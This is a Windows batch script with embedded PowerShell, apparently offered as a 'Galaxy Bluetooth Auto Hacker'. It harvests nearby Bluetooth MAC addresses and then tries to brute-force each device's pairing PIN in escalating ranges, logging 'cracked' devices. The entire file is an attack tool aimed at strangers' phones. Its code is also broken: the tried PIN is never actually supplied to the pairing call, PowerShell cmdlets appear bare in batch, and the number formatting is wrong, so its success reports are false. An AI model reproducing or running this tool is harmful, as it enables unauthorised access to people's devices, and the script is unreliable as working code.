@echo off
setlocal enabledelayedexpansion
title Galaxy Auto Hacker
color 0F

echo =====================================================
echo          Galaxy Bluetooth Auto Hacker
echo =====================================================
echo [INFO] 완전 자동화된 공격 체인 시작...
echo.

del target_macs.txt 2>nul
del cracked_devices.txt 2>nul
del failed_attacks.txt 2>nul

echo [PHASE 1] MAC 주소 수집 (30초)...
powershell -ExecutionPolicy Bypass -File harvest_macs.ps1

if not exist target_macs.txt (
    echo [ERROR] 타겟을 찾지 못했습니다.
    pause
    exit /b
)

set /p target_count=< target_macs.txt
for /f "tokens=*" %%i in ('type target_macs.txt ^| find /c /v ""') do set target_count=%%i

echo [FOUND] %target_count%개의 타겟 발견
echo.

set /p confirm="[CONFIRM] %target_count%개 디바이스를 공격하시겠습니까? (y/n): "
if /i not "%confirm%"=="y" (
    echo [ABORT] 공격 중단됨
    pause
    exit /b
)

echo [PHASE 2] 브루트포스 공격 시작...

set attack_count=0
for /f "tokens=*" %%m in (target_macs.txt) do (
    set /a attack_count+=1
    set current_mac=%%m
    
    echo [ATTACK !attack_count!/%target_count%] !current_mac! 공격 중...
    
    call :bruteforce_attack !current_mac!
    
    timeout /t 3 >nul
)

echo.
echo =====================================================
echo                공격 결과 요약
echo =====================================================

if exist cracked_devices.txt (
    echo [SUCCESS] 크랙 성공:
    type cracked_devices.txt
    echo.
)

if exist failed_attacks.txt (
    echo [FAILED] 크랙 실패:
    type failed_attacks.txt
    echo.
)

echo [COMPLETE] 자동 공격 완료!
pause
exit /b

:bruteforce_attack
set mac_to_attack=%1
set quick_success=false

echo [PHASE 2.1] 기본 PIN 브루트포스 시작...

powershell -ExecutionPolicy Bypass -Command "& {
    $targetMAC = '%mac_to_attack%'
    $address = [Convert]::ToUInt64($targetMAC.Replace(':', ''), 16)
    
    $quickPins = @('0000', '1234', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999')
    
    foreach ($pin in $quickPins) {
        try {
            Add-Type -AssemblyName System.Runtime.WindowsRuntime
            [Windows.Devices.Bluetooth.BluetoothDevice,Windows.Devices.Bluetooth,ContentType=WindowsRuntime] | Out-Null
            
            $device = [Windows.Devices.Bluetooth.BluetoothDevice]::FromBluetoothAddressAsync($address)
            
            if ($device.Result -ne $null) {
                Write-Host '[TEST]' $pin -ForegroundColor Yellow
                
                $pairingResult = $device.Result.DeviceInformation.Pairing.PairAsync()
                
                if ($pairingResult.Result.Status -eq 'Paired') {
                    Write-Host '[CRACKED]' $targetMAC '| PIN:' $pin -ForegroundColor Green
                    Add-Content -Path 'cracked_devices.txt' -Value ('MAC: ' + $targetMAC + ' | PIN: ' + $pin)
                    exit 0
                }
            }
            
            Start-Sleep -Milliseconds 300
            
        } catch {
            continue
        }
    }
    
    exit 1
}" 

if %errorlevel% equ 0 (
    echo [SUCCESS] 기본 PIN으로 크랙 성공!
    goto :eof
)

echo [FAILED] 기본 PIN 실패
echo.
set /p advanced="[OPTION] 고급 브루트포스를 실행하시겠습니까? (1000-9999) (y/n): "

if /i not "%advanced%"=="y" (
    echo [SKIP] 고급 브루트포스 건너뜀
    Add-Content -Path 'failed_attacks.txt' -Value ('MAC: ' + %mac_to_attack% + ' | Status: Basic Failed, Advanced Skipped')
    goto :eof
)

echo [PHASE 2.2] 고급 브루트포스 시작 (1000-9999)...

powershell -ExecutionPolicy Bypass -Command "& {
    $targetMAC = '%mac_to_attack%'
    $address = [Convert]::ToUInt64($targetMAC.Replace(':', ''), 16)
    
    Write-Host '[ADVANCED] Starting 4-digit bruteforce 1000-9999...' -ForegroundColor Cyan
    
    for ($i = 1000; $i -le 9999; $i++) {
        $pin = '{0:D4}' -f $i
        
        if ($i % 100 -eq 0) {
            Write-Host '[PROGRESS]' $i '/9999 (' ([math]::Round(($i/9999)*100, 2)) '%)' -ForegroundColor Yellow
        }
        
        try {
            Add-Type -AssemblyName System.Runtime.WindowsRuntime
            [Windows.Devices.Bluetooth.BluetoothDevice,Windows.Devices.Bluetooth,ContentType=WindowsRuntime] | Out-Null
            
            $device = [Windows.Devices.Bluetooth.BluetoothDevice]::FromBluetoothAddressAsync($address)
            
            if ($device.Result -ne $null) {
                Write-Host '[TEST]' $pin -ForegroundColor Gray
                
                $pairingResult = $device.Result.DeviceInformation.Pairing.PairAsync()
                
                if ($pairingResult.Result.Status -eq 'Paired') {
                    Write-Host '[CRACKED]' $targetMAC '| PIN:' $pin -ForegroundColor Green
                    Add-Content -Path 'cracked_devices.txt' -Value ('MAC: ' + $targetMAC + ' | PIN: ' + $pin + ' | Method: Advanced')
                    exit 0
                }
            }
            
            Start-Sleep -Milliseconds 200
            
        } catch {
            continue
        }
    }
    
    exit 1
}"

if %errorlevel% equ 0 (
    echo [SUCCESS] 고급 브루트포스로 크랙 성공!!!
    goto :eof
)

echo [FAILED] 고급 브루트포스 실패
echo.
set /p super="[OPTION] 슈퍼 브루트포스를 실행하시겠습니까? (10001~999999, 무한 시도) (y/n): "

if /i not "%super%"=="y" (
    echo [SKIP] 슈퍼 브루트포스 건너뜀
    Add-Content -Path 'failed_attacks.txt' -Value ('MAC: ' + %mac_to_attack% + ' | Status: Advanced Failed, Super Skipped')
    goto :eof
)

echo [PHASE 2.3] 슈퍼 브루트포스 시작 (10001~999999)...
echo [WARNING] 이 과정은 매우 오래 걸릴 수 있습니다. Ctrl+C로 중단 가능합니다.

powershell -ExecutionPolicy Bypass -Command "& {
    $targetMAC = '%mac_to_attack%'
    $address = [Convert]::ToUInt64($targetMAC.Replace(':', ''), 16)
    
    Write-Host '[SUPER] Starting unlimited bruteforce from 10001...' -ForegroundColor Red
    
    for ($i = 10001; $i -le 999999; $i++) {
        $pin = '{0:D4}' -f $i
        
        if ($i % 1000 -eq 0) {
            $progress = [math]::Round((($i-10000)/(999999-10000))*100, 2)
            Write-Host '[SUPER PROGRESS]' $i '/999999 (' $progress '%)' -ForegroundColor Magenta
            
            $elapsed = (Get-Date) - $startTime
            if (-not $startTime) { $startTime = Get-Date }
            Write-Host '[TIME]' $elapsed.ToString('hh\:mm\:ss') 'elapsed' -ForegroundColor Blue
        }
        
        try {
            Add-Type -AssemblyName System.Runtime.WindowsRuntime
            [Windows.Devices.Bluetooth.BluetoothDevice,Windows.Devices.Bluetooth,ContentType=WindowsRuntime] | Out-Null
            
            $device = [Windows.Devices.Bluetooth.BluetoothDevice]::FromBluetoothAddressAsync($address)
            
            if ($device.Result -ne $null) {
                if ($i % 10 -eq 0) {
                    Write-Host '[TEST]' $pin -ForegroundColor DarkGray
                }
                
                $pairingResult = $device.Result.DeviceInformation.Pairing.PairAsync()
                
                if ($pairingResult.Result.Status -eq 'Paired') {
                    Write-Host '[SUPER CRACKED]' $targetMAC '| PIN:' $pin -ForegroundColor Green
                    Write-Host '[VICTORY] PIN found after' $i 'attempts!' -ForegroundColor Green
                    Add-Content -Path 'cracked_devices.txt' -Value ('MAC: ' + $targetMAC + ' | PIN: ' + $pin + ' | Method: Super | Attempts: ' + $i)
                    exit 0
                }
            }
            
            Start-Sleep -Milliseconds 150
            
        } catch {
            continue
        }
    }
    
    Write-Host '[EXHAUSTED] All combinations tried, no PIN found' -ForegroundColor Red
    exit 1
}"

if %errorlevel% equ 0 (
    echo [SUCCESS] 슈퍼 브루트포스로 크랙 성공!!!!!
) else (
    echo [ULTIMATE FAIL] 모든 방법 실패
    Add-Content -Path 'failed_attacks.txt' -Value ('MAC: ' + %mac_to_attack% + ' | Status: All Methods Failed')
)

goto :eof
